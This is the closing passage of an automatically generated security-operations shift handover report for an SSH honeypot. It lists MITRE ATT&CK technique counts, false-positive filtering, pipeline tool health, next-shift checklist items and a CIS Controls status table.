| [T1078](https://attack.mitre.org/techniques/T1078) | 371 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 198 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 68 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 67 |

---

## 🔕 False Positive Summary (60 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 6 |
| AbuseIPDB score 20 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 30 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 505 cases |
| Tool 34  | Credential Extractor        | ✅ 672 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 203 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 176 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 60 filtered (11.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 93 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 364 priority case(s) shown individually · 71 recon entry/entries in table (8 group(s) consolidating 18 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-25T20:50:31Z_
